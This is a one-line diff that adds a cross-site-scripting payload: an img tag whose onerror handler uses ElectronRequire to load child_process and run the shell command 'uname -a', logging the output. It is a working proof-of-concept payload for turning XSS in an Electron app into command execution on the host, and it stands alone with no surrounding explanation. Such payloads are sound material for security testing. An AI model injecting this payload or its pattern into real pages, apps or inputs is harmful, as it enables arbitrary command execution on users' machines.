@@ -1,0 +1,1 @@
+<img src=1 onerror='ElectronRequire("child_process").exec("uname -a",function(error,stdout,stderr){console.log(stdout);});'>
